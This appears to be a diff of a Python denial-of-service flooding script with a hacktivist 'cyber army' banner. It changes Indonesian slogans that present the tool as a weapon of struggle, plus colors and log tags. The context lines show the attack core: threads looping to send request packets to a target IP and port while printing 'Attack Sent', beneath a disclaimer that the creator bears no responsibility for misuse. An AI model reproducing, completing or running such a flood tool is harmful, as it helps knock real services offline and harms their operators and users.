@@ -28,10 +28,7 @@ logo = """
             ▒▒▒▒▒       ▒▒                 ▒▒     ▒
              ▒▒▒        ▒▒                 ▒       ▒
             ▒▒          ▒                   ▒      ▒
-
-   
-
-\033[31m            THE  CREATOR  IS  NOT  RESPONSIBLE 
+\033[92m            THE  CREATOR  IS  NOT  RESPONSIBLE 
 \033[32m                FOR  ANY  FORM  OF  MISUSE
 \033[33m                      Design By: KF24
 \033[97m                        ——°oO0Oo°——
@@ -78,11 +75,11 @@ print("\033[94m———————⟩⟩⟩"),
 time.sleep(5),
 print("\033[96m        ⟩⟩  CYBER ATTACK PEOPLE \033[0m "),
 time.sleep(5),
-print("\033[92m        ⟩⟩  ADALAH CYBER ARMY \033[0m "),
+print("\033[92m        ⟩⟩  SCRIPT INI DIBUAT \033[0m "),
 time.sleep(5),
-print("\033[1m        ⟩⟩  YANG BERJUANG  \033[0m "),
+print("\033[1m        ⟩⟩   SEBAGAI ALAT PERJUANGAN \033[0m "),
 time.sleep(5),
-print("\033[97m        ⟩⟩  KARENA KESEWENANGAN \033[0m "),
+print("\033[97m        ⟩⟩  DIAKIBATKAN KESEWENANGAN \033[0m "),
 time.sleep(5),
 print("\033[95m        ⟩⟩  BANGSA BAR-BAR \033[0m "),
 time.sleep(5),
@@ -105,11 +102,11 @@ def start():
             for i in range(packs):
                 s.send(str.encode(main_req))
                 xx += random.randint(0, int(packs))
-                print("\033[96m[★\033[96m]  \033[96m[KOMA]  \033[33m[Attack Sent]  \033[92m{0}:{1}  \033[37m{2}\033[0m".format(str(ip), int(port), xx))
+                print("\033[96m[★\033[96m]  \033[96m[CAT]  \033[33m[Attack Sent]  \033[92m{0}:{1}  \033[37m{2}\033[0m".format(str(ip), int(port), xx))
                 
         except:
                 s.close()
-                print("[x]  \033[95m[KOMA]  \033[33m[Attack Sent]  \033[92m{0}:{1}  \033[31m{2}\033[0m".format(str(ip), int(port), xx))
+                print("[x]  \033[95m[CAT]  \033[33m[Attack Sent]  \033[92m{0}:{1}  \033[31m{2}\033[0m".format(str(ip), int(port), xx))
                     
 for x in range(thread):
     thred = threading.Thread(target=start)
